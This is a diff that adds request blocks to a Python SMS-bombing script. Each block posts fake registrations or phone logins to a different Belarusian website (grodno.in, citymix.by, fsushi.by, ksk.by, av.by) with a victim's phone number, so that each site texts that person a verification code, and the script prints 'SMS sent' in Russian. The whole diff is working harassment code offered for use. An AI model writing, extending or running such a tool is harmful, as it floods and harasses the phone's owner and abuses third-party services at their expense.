@@ -273,3 +273,74 @@ if response.status_code == 200:
     print(Fore.GREEN + "Смс от mila отправлено!")
 else:
     print(Fore.RED + "Смс от mila не отправлено!")
+
+
+dates = {
+    "ajax": "register",
+    "user": "ivanovivan4ik",
+    "pass": "123321123Eg",
+    "phone_country": "+375",
+    "accept": "1",
+    "phone_code": f"{phone[4:7]}",
+    "phone_number": f"{phone[7:]}",
+    "resend": "1",
+    "code": ""
+}
+
+response = requests.post('https://grodno.in/register/', data=dates, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от grodno.in отправлено!")
+else:
+    print(Fore.RED + "Смс от grodno.in не отправлено!")
+
+
+response = requests.post('https://api.citymix.by/auth/register', json={"phone":f"{phone}","password":"123321123Eg","code":"","resend":1}, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от citymix отправлено!")
+    print(response.text)
+else:
+    print(Fore.RED + "Смс от citymix не отправлено!")
+    print(response.text)
+
+dates = {
+    "CSRF": "",
+    "ACTION": "REGISTER",
+    "MODE": "PHONE",
+    "PHONE": f"{phone}",
+    "PASSWORD": "123321123Eg",
+    "PASSWORD2": "123321123Eg"
+}
+
+response = requests.post('https://fsushi.by/?action=auth', data=dates, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от fsushi отправлено!")
+    print(response.text)
+else:
+    print(Fore.RED + "Смс от fsushi не отправлено!")
+    print(response.text)
+
+
+headers1 = {
+    "user-agent": user
+}
+
+dates = {
+    "phone": f"{phone[1:]}"
+}
+
+response = requests.post('https://ksk.by/index.php?route=module/login_form/userAutPhone', data=dates, headers=headers1)
+if response.status_code == 200:
+    print(Fore.GREEN + "Смс от ksk.by отправлено!")
+    print(response.text)
+else:
+    print(Fore.RED + "Смс от ksk.by не отправлено!")
+    print(response.text)
+
+
+response = requests.post('https://api.av.by/auth/phone/sign-up',json={"name":"Иван","password":"123321123Eg","phone":{"country":"1","number":f"{phone[:4]}"},"userEula":{"accepted":"true"}}, headers=headers1)
+if response.status_code == 204:
+    print(Fore.GREEN + "Смс от av.by отправлено!")
+else:
+    print(Fore.RED + "Смс от av.by не отправлено!")
+
+
